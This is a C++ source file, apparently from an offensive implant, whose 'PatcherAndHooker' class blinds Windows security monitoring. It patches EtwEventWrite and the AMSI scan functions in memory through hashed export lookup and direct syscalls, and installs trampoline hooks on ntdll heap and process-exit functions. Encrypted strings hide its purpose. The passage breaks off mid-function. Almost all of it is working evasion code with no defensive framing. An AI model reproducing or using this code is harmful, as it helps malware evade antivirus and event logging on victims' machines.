#include "PatcherAndHooker.hpp"
#include "Instance.hpp"
#include "Syscalls.hpp"
#include "StringCrypt.hpp"
#include "Win32.hpp"
#include "Zydis/Zydis.h"
#include "StackHeapCrypt.hpp"
#include "SecureWideString.hpp"
#include "SecureException.hpp"
#include <inttypes.h> // Include for PRIX64 macro
#include <iostream>
#include <intrin.h>
#pragma intrinsic(_ReturnAddress)

bool PatcherAndHooker::AmsiLoaded = false;
RestoreBuffer PatcherAndHooker::RestoreBuffers;
RestoreJumpBuffer PatcherAndHooker::RestoreJumpBuffers;
CRITICAL_SECTION PatcherAndHooker::CriticalSection;

PatcherAndHooker::PatcherAndHooker() {
    pRtlInitializeCriticalSection _pRtlInitializeCriticalSection = (pRtlInitializeCriticalSection)Win32::NtdllTable.pRtlInitializeCriticalSection.pAddress;
    Instance::NtStatus = _pRtlInitializeCriticalSection(&CriticalSection);
    if (!NT_SUCCESS(Instance::NtStatus)) {
		throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::INITIALIZINGCRITICALSECTION_CRYPT), Instance::NtStatus));
	}
};

void PatcherAndHooker::DoPatches(bool restore) {
	PatchETW(restore);
	PatchAMSI(restore);
}

void PatcherAndHooker::HookHeapFunctions(bool restore) {
    PrepareHook(restore, RTLALLOCATEHEAP_HOOK);
    PrepareHook(restore, RTLREALLOCATEHEAP_HOOK);
    PrepareHook(restore, RTLFREEHEAP_HOOK);
}

void PatcherAndHooker::PatchETW(bool restore) {
    PUNICODE_STRING pDllName = NULL, pFullDllName = NULL;
    PVOID pModuleBase = NULL;
    PPEB_LDR_DATA pLdrData = NULL;
    PLDR_DATA_TABLE_ENTRY pModuleEntry = NULL, pModuleStart = NULL;
    PPEB pCurrentPeb = SystemCalls::Peb;
    ULONG oldProtect = 0;
    BYTE patchBytes[] = { "\x48\x33\xc0\xc3" };
    SIZE_T regionSize = sizeof(patchBytes);
    pLdrData = pCurrentPeb->Ldr;
    pModuleEntry = pModuleStart = (PLDR_DATA_TABLE_ENTRY)pLdrData->InLoadOrderModuleList.Flink;

    do {
        pDllName = &pModuleEntry->BaseDllName;
        pFullDllName = &pModuleEntry->FullDllName;
        if (pDllName->Buffer == NULL) {
            //printf("[*] got null...\n");
            break;
        }
        //printf("Full: %ls\n", pFullDllName->Buffer);

        if (SystemCalls::djb2_unicode(SystemCalls::SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(NTDLLDLL_HASH)) {
            //printf("[+] Got module!\n");
            pModuleBase = (PVOID)pModuleEntry->DllBase;
            PIMAGE_DOS_HEADER pInMemImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
            PIMAGE_NT_HEADERS pInMemImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pInMemImageDosHeader->e_lfanew);
            PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pInMemImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);

            PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
            PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
            PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);
            BOOL bFound = FALSE;
            for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
                PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
                PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];
                PVOID oFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];
                if (SystemCalls::djb2(reinterpret_cast<unsigned char*>(pczFunctionName)) == SystemCalls::xor_hash(ETWEVENTWRITE_HASH)) {
#ifdef DEBUG
                    printf("[+] Got func!\n");
#endif
                    // Read the original bytes of the function if not already read
                    if (!RestoreBuffers.EtwEventWrite.populated) {
                        RestoreBuffers.EtwEventWrite.buffer.resize(JUMP_STUB_SIZE);
                        SyscallPrepare(SystemCalls::SysTable.SysNtReadVirtualMemory.wSyscallNr, SystemCalls::SysTable.SysNtReadVirtualMemory.pRecycled);
                        Instance::NtStatus = SysNtReadVirtualMemory(Instance::Process, pFunctionAddress, RestoreBuffers.EtwEventWrite.buffer.data(), RestoreBuffers.EtwEventWrite.buffer.size(), NULL);
                        if (!NT_SUCCESS(Instance::NtStatus)) {
                            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::READINGMEMORY_CRYPT), Instance::NtStatus));
                        }
                    }
                    RestoreBuffers.EtwEventWrite.populated = true;

                    if (!restore) {
                        SyscallPrepare(SystemCalls::SysTable.SysNtProtectVirtualMemory.wSyscallNr, SystemCalls::SysTable.SysNtProtectVirtualMemory.pRecycled);
                        Instance::NtStatus = SysNtProtectVirtualMemory(Instance::Process, &pFunctionAddress, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
                        if (!NT_SUCCESS(Instance::NtStatus)) {
                            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::PROTECTINGMEMORY_CRYPT), Instance::NtStatus));
                        }
                        SyscallPrepare(SystemCalls::SysTable.SysNtWriteVirtualMemory.wSyscallNr, SystemCalls::SysTable.SysNtWriteVirtualMemory.pRecycled);
                        Instance::NtStatus = SysNtWriteVirtualMemory(Instance::Process, oFunctionAddress, (LPVOID)patchBytes, sizeof(patchBytes), NULL);
                        if (!NT_SUCCESS(Instance::NtStatus)) {
                            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::WRITINGMEMORY_CRYPT), Instance::NtStatus));
                        }
                        SyscallPrepare(SystemCalls::SysTable.SysNtProtectVirtualMemory.wSyscallNr, SystemCalls::SysTable.SysNtProtectVirtualMemory.pRecycled);
                        Instance::NtStatus = SysNtProtectVirtualMemory(Instance::Process, &pFunctionAddress, &regionSize, oldProtect, &oldProtect);
                        if (!NT_SUCCESS(Instance::NtStatus)) {
                            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::PROTECTINGMEMORY_CRYPT), Instance::NtStatus));
                        }
                    }
                    else {
                        regionSize = RestoreBuffers.EtwEventWrite.buffer.size();
                        SyscallPrepare(SystemCalls::SysTable.SysNtProtectVirtualMemory.wSyscallNr, SystemCalls::SysTable.SysNtProtectVirtualMemory.pRecycled);
                        Instance::NtStatus = SysNtProtectVirtualMemory(Instance::Process, &pFunctionAddress, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
                        if (!NT_SUCCESS(Instance::NtStatus)) {
                            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::PROTECTINGMEMORY_CRYPT), Instance::NtStatus));
                        }
                        SyscallPrepare(SystemCalls::SysTable.SysNtWriteVirtualMemory.wSyscallNr, SystemCalls::SysTable.SysNtWriteVirtualMemory.pRecycled);
                        Instance::NtStatus = SysNtWriteVirtualMemory(Instance::Process, oFunctionAddress, RestoreBuffers.EtwEventWrite.buffer.data(), RestoreBuffers.EtwEventWrite.buffer.size(), NULL);
                        if (!NT_SUCCESS(Instance::NtStatus)) {
                            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::WRITINGMEMORY_CRYPT), Instance::NtStatus));
                        }
                        SyscallPrepare(SystemCalls::SysTable.SysNtProtectVirtualMemory.wSyscallNr, SystemCalls::SysTable.SysNtProtectVirtualMemory.pRecycled);
                        Instance::NtStatus = SysNtProtectVirtualMemory(Instance::Process, &pFunctionAddress, &regionSize, oldProtect, &oldProtect);
                        if (!NT_SUCCESS(Instance::NtStatus)) {
                            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::PROTECTINGMEMORY_CRYPT), Instance::NtStatus));
                        }
                    }
                    bFound = TRUE;
                    break;
                }
            }
            if (!bFound)
                throw SecureException(Instance::FormatErrorMessage(StringCrypt::DecryptString(StringCrypt::FINDINGFUNC_CRYPT)));
        }
        pModuleEntry = (PLDR_DATA_TABLE_ENTRY)pModuleEntry->InLoadOrderLinks.Flink;
    } while (pModuleEntry != pModuleStart);
}

void PatcherAndHooker::PatchAMSI(bool restore) {
    UNICODE_STRING path;
    PVOID pModuleBase;
    BOOL bFound1 = FALSE, bFound2 = FALSE;
    BYTE patchBytes1[] = { 0x31, 0xC0, 0x05, 0x4E, 0xFE, 0xFD, 0x7D, 0x05, 0x09, 0x02, 0x09, 0x02, 0xC3 };
    BYTE patchBytes2[] = { 0x48, 0x31, 0xC0 };
    SIZE_T regionSize = sizeof(patchBytes1);
    ULONG oldProtect = 0;

    // Only load amsi.dll if not already loaded
    if (!AmsiLoaded) {
        ModuleDetails moduleDetails = Win32::ProxyLoadLibrary(AMSIDLL_HASH, StringCrypt::AMSIDLL_CRYPT);
        pModuleBase = moduleDetails.BaseAddress;
        AmsiLoaded = true;
    }
    else {
        ModuleDetails moduleDetails = Instance::GetModuleDetails(AMSIDLL_HASH);
        pModuleBase = moduleDetails.BaseAddress;
    }

    PIMAGE_DOS_HEADER pInMemImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;

    if (pInMemImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        throw SecureException(Instance::FormatErrorMessage(StringCrypt::DecryptString(StringCrypt::RETRIEVINGHEADERS_CRYPT)));
    }
    PIMAGE_NT_HEADERS pInMemImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pInMemImageDosHeader->e_lfanew);
    if (pInMemImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        throw SecureException(Instance::FormatErrorMessage(StringCrypt::DecryptString(StringCrypt::RETRIEVINGHEADERS_CRYPT)));
    }

    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pInMemImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);

    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);
    for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
        PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];
        PVOID oFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];
        if (SystemCalls::djb2(reinterpret_cast<unsigned char*>(pczFunctionName)) == SystemCalls::xor_hash(AMSISCANBUFFER_HASH)) {
#ifdef DEBUG
            printf("[+] Got func!\n");
#endif
            // Read the original bytes of the function if not already read
            if (!RestoreBuffers.AmsiScanBuffer.populated) {
                RestoreBuffers.AmsiScanBuffer.buffer.resize(JUMP_STUB_SIZE);
                SyscallPrepare(SystemCalls::SysTable.SysNtReadVirtualMemory.wSyscallNr, SystemCalls::SysTable.SysNtReadVirtualMemory.pRecycled);
                Instance::NtStatus = SysNtReadVirtualMemory(Instance::Process, pFunctionAddress, RestoreBuffers.AmsiScanBuffer.buffer.data(), RestoreBuffers.AmsiScanBuffer.buffer.size(), NULL);
                if (!NT_SUCCESS(Instance::NtStatus)) {
                    throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::READINGMEMORY_CRYPT), Instance::NtStatus));
                }
            }
            RestoreBuffers.AmsiScanBuffer.populated = true;

            if (!restore) {
                SyscallPrepare(SystemCalls::SysTable.SysNtProtectVirtualMemory.wSyscallNr, SystemCalls::SysTable.SysNtProtectVirtualMemory.pRecycled);
                Instance::NtStatus = SysNtProtectVirtualMemory(Instance::Process, &pFunctionAddress, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
                if (!NT_SUCCESS(Instance::NtStatus)) {
                    throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::PROTECTINGMEMORY_CRYPT), Instance::NtStatus));
                }
                SyscallPrepare(SystemCalls::SysTable.SysNtWriteVirtualMemory.wSyscallNr, SystemCalls::SysTable.SysNtWriteVirtualMemory.pRecycled);
                Instance::NtStatus = SysNtWriteVirtualMemory(Instance::Process, oFunctionAddress, (LPVOID)patchBytes1, sizeof(patchBytes1), NULL);
                if (!NT_SUCCESS(Instance::NtStatus)) {
                    throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::WRITINGMEMORY_CRYPT), Instance::NtStatus));
                }
                SyscallPrepare(SystemCalls::SysTable.SysNtProtectVirtualMemory.wSyscallNr, SystemCalls::SysTable.SysNtProtectVirtualMemory.pRecycled);
                Instance::NtStatus = SysNtProtectVirtualMemory(Instance::Process, &pFunctionAddress, &regionSize, oldProtect, &oldProtect);
                if (!NT_SUCCESS(Instance::NtStatus)) {
                    throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::PROTECTINGMEMORY_CRYPT), Instance::NtStatus));
                }
            }
            else {
                regionSize = RestoreBuffers.AmsiScanBuffer.buffer.size();
                SyscallPrepare(SystemCalls::SysTable.SysNtProtectVirtualMemory.wSyscallNr, SystemCalls::SysTable.SysNtProtectVirtualMemory.pRecycled);
                Instance::NtStatus = SysNtProtectVirtualMemory(Instance::Process, &pFunctionAddress, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
                if (!NT_SUCCESS(Instance::NtStatus)) {
                    throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::PROTECTINGMEMORY_CRYPT), Instance::NtStatus));
                }
                SyscallPrepare(SystemCalls::SysTable.SysNtWriteVirtualMemory.wSyscallNr, SystemCalls::SysTable.SysNtWriteVirtualMemory.pRecycled);
                Instance::NtStatus = SysNtWriteVirtualMemory(Instance::Process, oFunctionAddress, RestoreBuffers.AmsiScanBuffer.buffer.data(), RestoreBuffers.AmsiScanBuffer.buffer.size(), NULL);
                if (!NT_SUCCESS(Instance::NtStatus)) {
                    throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::WRITINGMEMORY_CRYPT), Instance::NtStatus));
                }
                SyscallPrepare(SystemCalls::SysTable.SysNtProtectVirtualMemory.wSyscallNr, SystemCalls::SysTable.SysNtProtectVirtualMemory.pRecycled);
                Instance::NtStatus = SysNtProtectVirtualMemory(Instance::Process, &pFunctionAddress, &regionSize, oldProtect, &oldProtect);
                if (!NT_SUCCESS(Instance::NtStatus)) {
                    throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::PROTECTINGMEMORY_CRYPT), Instance::NtStatus));
                }
            }
            bFound1 = TRUE;
        }
        else if (SystemCalls::djb2(reinterpret_cast<unsigned char*>(pczFunctionName)) == SystemCalls::xor_hash(AMSIOPENSESSION_HASH)) {
#ifdef DEBUG
            printf("[+] Got func!\n");
#endif
            // Read the original bytes of the function if not already read
            if (!RestoreBuffers.AmsiOpenSession.populated) {
                RestoreBuffers.AmsiOpenSession.buffer.resize(JUMP_STUB_SIZE);
                SyscallPrepare(SystemCalls::SysTable.SysNtReadVirtualMemory.wSyscallNr, SystemCalls::SysTable.SysNtReadVirtualMemory.pRecycled);
                Instance::NtStatus = SysNtReadVirtualMemory(Instance::Process, pFunctionAddress, RestoreBuffers.AmsiOpenSession.buffer.data(), RestoreBuffers.AmsiOpenSession.buffer.size(), NULL);
                if (!NT_SUCCESS(Instance::NtStatus)) {
                    throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::READINGMEMORY_CRYPT), Instance::NtStatus));
                }
            }
            RestoreBuffers.AmsiOpenSession.populated = true;

            if (!restore) {
                regionSize = sizeof(patchBytes2);
                SyscallPrepare(SystemCalls::SysTable.SysNtProtectVirtualMemory.wSyscallNr, SystemCalls::SysTable.SysNtProtectVirtualMemory.pRecycled);
                Instance::NtStatus = SysNtProtectVirtualMemory(Instance::Process, &pFunctionAddress, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
                if (!NT_SUCCESS(Instance::NtStatus)) {
                    throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::PROTECTINGMEMORY_CRYPT), Instance::NtStatus));
                }
                SyscallPrepare(SystemCalls::SysTable.SysNtWriteVirtualMemory.wSyscallNr, SystemCalls::SysTable.SysNtWriteVirtualMemory.pRecycled);
                Instance::NtStatus = SysNtWriteVirtualMemory(Instance::Process, oFunctionAddress, (LPVOID)patchBytes2, sizeof(patchBytes2), NULL);
                if (!NT_SUCCESS(Instance::NtStatus)) {
                    throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::WRITINGMEMORY_CRYPT), Instance::NtStatus));
                }
                SyscallPrepare(SystemCalls::SysTable.SysNtProtectVirtualMemory.wSyscallNr, SystemCalls::SysTable.SysNtProtectVirtualMemory.pRecycled);
                Instance::NtStatus = SysNtProtectVirtualMemory(Instance::Process, &pFunctionAddress, &regionSize, oldProtect, &oldProtect);
                if (!NT_SUCCESS(Instance::NtStatus)) {
                    throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::PROTECTINGMEMORY_CRYPT), Instance::NtStatus));
                }
            }
            else {
                regionSize = RestoreBuffers.AmsiOpenSession.buffer.size();
                SyscallPrepare(SystemCalls::SysTable.SysNtProtectVirtualMemory.wSyscallNr, SystemCalls::SysTable.SysNtProtectVirtualMemory.pRecycled);
                Instance::NtStatus = SysNtProtectVirtualMemory(Instance::Process, &pFunctionAddress, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
                if (!NT_SUCCESS(Instance::NtStatus)) {
                    throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::PROTECTINGMEMORY_CRYPT), Instance::NtStatus));
                }
                SyscallPrepare(SystemCalls::SysTable.SysNtWriteVirtualMemory.wSyscallNr, SystemCalls::SysTable.SysNtWriteVirtualMemory.pRecycled);
                Instance::NtStatus = SysNtWriteVirtualMemory(Instance::Process, oFunctionAddress, RestoreBuffers.AmsiOpenSession.buffer.data(), RestoreBuffers.AmsiOpenSession.buffer.size(), NULL);
                if (!NT_SUCCESS(Instance::NtStatus)) {
                    throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::WRITINGMEMORY_CRYPT), Instance::NtStatus));
                }
                SyscallPrepare(SystemCalls::SysTable.SysNtProtectVirtualMemory.wSyscallNr, SystemCalls::SysTable.SysNtProtectVirtualMemory.pRecycled);
                Instance::NtStatus = SysNtProtectVirtualMemory(Instance::Process, &pFunctionAddress, &regionSize, oldProtect, &oldProtect);
                if (!NT_SUCCESS(Instance::NtStatus)) {
                    throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::PROTECTINGMEMORY_CRYPT), Instance::NtStatus));
                }
            }
            bFound2 = TRUE;
        }
    }
    if (!bFound1 || !bFound2)
        throw SecureException(Instance::FormatErrorMessage(StringCrypt::DecryptString(StringCrypt::FINDINGFUNC_CRYPT)));
}

/*
* This function will scan the beginning of a function looking for suitable restoration bytes for hooking and calling the original function.
* The 64-bit hooking stub originally consumes 13 bytes, this function essentially continues to read bytes until there is not a split instruction.
* A split instruction will ruin the call to the original function. The disassembler used is Zydis https://github.com/zyantific/zydis
* The compiler flags needed were found on this issue: https://github.com/zyantific/zydis/issues/370
*/
size_t PatcherAndHooker::GetStubSize(PVOID address) {
    const int INITIAL_BUFFER_SIZE = 13;
    int bufferSize = INITIAL_BUFFER_SIZE;
    ZyanU8* data = new ZyanU8[bufferSize];

    ZyanU64 runtime_address = (ZyanU64)address;
    ZyanUSize offset = 0;
    ZydisDisassembledInstruction instruction;

    while (true) {
        SyscallPrepare(SystemCalls::SysTable.SysNtReadVirtualMemory.wSyscallNr, SystemCalls::SysTable.SysNtReadVirtualMemory.pRecycled);
        Instance::NtStatus = SysNtReadVirtualMemory(Instance::Process, address, data, bufferSize, NULL);
        if (!NT_SUCCESS(Instance::NtStatus)) {
            delete[] data;
            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::READINGMEMORY_CRYPT), Instance::NtStatus));
        }

        bool complete = false;
        offset = 0;
        while (offset < bufferSize) {
            ZyanStatus disasmStatus = ZydisDisassembleIntel(
                ZYDIS_MACHINE_MODE_LONG_64,
                runtime_address + offset,
                data + offset,
                bufferSize - offset,
                &instruction
            );

            if (ZYAN_SUCCESS(disasmStatus)) {
                //printf("%016" PRIX64 "  %s\n", runtime_address + offset, instruction.text);
                offset += instruction.info.length;
            }
            else {
                break;
            }

            if (offset == bufferSize) {
                complete = true;
                break;
            }
        }

        if (complete) break;

        // Increase buffer size and reallocate memory
        bufferSize++;
        ZyanU8* newData = new ZyanU8[bufferSize];
        Instance::memcpy(newData, data, bufferSize - 1);
        delete[] data;
        data = newData;
    }

    //printf("Final Offset: %d\n", offset);
    delete[] data;
    return offset;
}

void PatcherAndHooker::InstallHook(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, DWORD dwCryptedHash, LPVOID jumpAddress, bool restore, RestoreBufferEntry* restoreBuffer, RestoreJumpBufferEntry* restoreJumpBuffer) {
    uint8_t trampoline[] = {
        0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, addr
        0x41, 0xFF, 0xE2                                            // jmp r10
    };
    ULONG oldProtect = 0;
    SIZE_T regionSize = 0;
    BOOL bFound = FALSE;

    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);
    for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
        PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];
        PVOID oFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];
        if (SystemCalls::djb2(reinterpret_cast<unsigned char*>(pczFunctionName)) == SystemCalls::xor_hash(dwCryptedHash)) {
            //printf("[+] Got func at %p jumpAddress: %p\n", oFunctionAddress, jumpAddress);
            // Read the original bytes of the function if not already read
            if (!restoreBuffer->populated) {
                // Get the size of the original bytes that will not contain a split instruction
                SIZE_T restoreBytesSize = GetStubSize(pFunctionAddress);
                SIZE_T restoreJumpSize = restoreBytesSize + sizeof(trampoline);
                restoreBuffer->buffer.resize(restoreBytesSize);
				SyscallPrepare(SystemCalls::SysTable.SysNtReadVirtualMemory.wSyscallNr, SystemCalls::SysTable.SysNtReadVirtualMemory.pRecycled);
				Instance::NtStatus = SysNtReadVirtualMemory(Instance::Process, pFunctionAddress, restoreBuffer->buffer.data(), restoreBuffer->buffer.size(), NULL);
                if (!NT_SUCCESS(Instance::NtStatus)) {
					throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::READINGMEMORY_CRYPT), Instance::NtStatus));
				}                
                restoreBuffer->populated = true;

                if (!restoreJumpBuffer->populated) {
                    // Allocate executable memory for the restore jump buffer
                    SyscallPrepare(SystemCalls::SysTable.SysNtAllocateVirtualMemory.wSyscallNr, SystemCalls::SysTable.SysNtAllocateVirtualMemory.pRecycled);
                    Instance::NtStatus = SysNtAllocateVirtualMemory(Instance::Process, &restoreJumpBuffer->buffer, 0, &restoreJumpSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                    if (!NT_SUCCESS(Instance::NtStatus)) {
                        throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::ALLOCATINGMEMORY_CRYPT), Instance::NtStatus));
                    }
                    restoreJumpBuffer->size = restoreJumpSize;
                    // Prepare the restore jump buffer
                    BYTE* pJumpBuffer = static_cast<BYTE*>(*&restoreJumpBuffer->buffer);
                    // The rest of your code remains the same
                    Instance::memcpy(pJumpBuffer, restoreBuffer->buffer.data(), restoreBuffer->buffer.size());
                    // Prepare the MOV R10, [Address] instruction
                    pJumpBuffer[restoreBytesSize] = 0x49;
                    pJumpBuffer[restoreBytesSize + 1] = 0xBA;
                    PVOID continuationAddress = (PBYTE)pFunctionAddress + restoreBytesSize; // Calculate continuation address
                    //printf("Continuation address: %p\n", continuationAddress);
                    Instance::memcpy(&pJumpBuffer[restoreBytesSize + 2], &continuationAddress, sizeof(LPVOID));
                    // Prepare the JMP R10 instruction
                    pJumpBuffer[restoreBytesSize + 10] = 0x41;
                    pJumpBuffer[restoreBytesSize + 11] = 0xFF;
                    pJumpBuffer[restoreBytesSize + 12] = 0xE2;
                    /*for (int i = 0; i < restoreJumpSize; i++) {
                        printf("Byte %d: 0x%x\n", i, pJumpBuffer[i]);
                    }*/
                    restoreJumpBuffer->populated = true;
                }
			}
            if (!restore) {
                uint64_t addr = (uint64_t)(jumpAddress);
                memcpy(&trampoline[2], &addr, sizeof(addr));
                regionSize = sizeof(trampoline);

                SyscallPrepare(SystemCalls::SysTable.SysNtProtectVirtualMemory.wSyscallNr, SystemCalls::SysTable.SysNtProtectVirtualMemory.pRecycled);
                Instance::NtStatus = SysNtProtectVirtualMemory(Instance::Process, &pFunctionAddress, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
                if (!NT_SUCCESS(Instance::NtStatus)) {
                    throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::PROTECTINGMEMORY_CRYPT), Instance::NtStatus));
                }
                SyscallPrepare(SystemCalls::SysTable.SysNtWriteVirtualMemory.wSyscallNr, SystemCalls::SysTable.SysNtWriteVirtualMemory.pRecycled);
                Instance::NtStatus = SysNtWriteVirtualMemory(Instance::Process, oFunctionAddress, (LPVOID)trampoline, sizeof(trampoline), NULL);
                if (!NT_SUCCESS(Instance::NtStatus)) {
                    throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::WRITINGMEMORY_CRYPT), Instance::NtStatus));
                }
                SyscallPrepare(SystemCalls::SysTable.SysNtProtectVirtualMemory.wSyscallNr, SystemCalls::SysTable.SysNtProtectVirtualMemory.pRecycled);
                Instance::NtStatus = SysNtProtectVirtualMemory(Instance::Process, &pFunctionAddress, &regionSize, oldProtect, &oldProtect);
                if (!NT_SUCCESS(Instance::NtStatus)) {
                    throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::PROTECTINGMEMORY_CRYPT), Instance::NtStatus));
                }
            }
            else {
                regionSize = restoreBuffer->buffer.size();
                SyscallPrepare(SystemCalls::SysTable.SysNtProtectVirtualMemory.wSyscallNr, SystemCalls::SysTable.SysNtProtectVirtualMemory.pRecycled);
                Instance::NtStatus = SysNtProtectVirtualMemory(Instance::Process, &pFunctionAddress, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
                if (!NT_SUCCESS(Instance::NtStatus)) {
					throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::PROTECTINGMEMORY_CRYPT), Instance::NtStatus));
				}
                SyscallPrepare(SystemCalls::SysTable.SysNtWriteVirtualMemory.wSyscallNr, SystemCalls::SysTable.SysNtWriteVirtualMemory.pRecycled);
                Instance::NtStatus = SysNtWriteVirtualMemory(Instance::Process, oFunctionAddress, restoreBuffer->buffer.data(), restoreBuffer->buffer.size(), NULL);
                if (!NT_SUCCESS(Instance::NtStatus)) {
                    throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::WRITINGMEMORY_CRYPT), Instance::NtStatus));
                }
                SyscallPrepare(SystemCalls::SysTable.SysNtProtectVirtualMemory.wSyscallNr, SystemCalls::SysTable.SysNtProtectVirtualMemory.pRecycled);
                Instance::NtStatus = SysNtProtectVirtualMemory(Instance::Process, &pFunctionAddress, &regionSize, oldProtect, &oldProtect);
                if (!NT_SUCCESS(Instance::NtStatus)) {
                    throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::PROTECTINGMEMORY_CRYPT), Instance::NtStatus));
                }
            }
            bFound = TRUE;
        }
    }
    if (!bFound)
        throw SecureException(Instance::FormatErrorMessage(StringCrypt::DecryptString(StringCrypt::FINDINGFUNC_CRYPT)));
}

void PatcherAndHooker::PrepareHook(bool restore, int choice) {
    switch (choice) {
        case RTLEXITUSERPROCESS_HOOK:
            ModuleDetails ntdllDetails = Instance::GetModuleDetails(NTDLLDLL_HASH);
            InstallHook(ntdllDetails.BaseAddress, ntdllDetails.ImageExportDirectory, RTLEXITUSERPROCESS_HASH, (void*)&HookedRtlExitUserProcess, restore, &RestoreBuffers.RtlExitUserProcess, &RestoreJumpBuffers.RtlExitUserProcess);
            break;
        case RTLALLOCATEHEAP_HOOK:
            ModuleDetails ntdllDetails2 = Instance::GetModuleDetails(NTDLLDLL_HASH);
			InstallHook(ntdllDetails2.BaseAddress, ntdllDetails2.ImageExportDirectory, RTLALLOCATEHEAP_HASH, (void*)&HookedRtlAllocateHeap, restore, &RestoreBuffers.RtlAllocateHeap, &RestoreJumpBuffers.RtlAllocateHeap);
			break;
        case RTLREALLOCATEHEAP_HOOK:
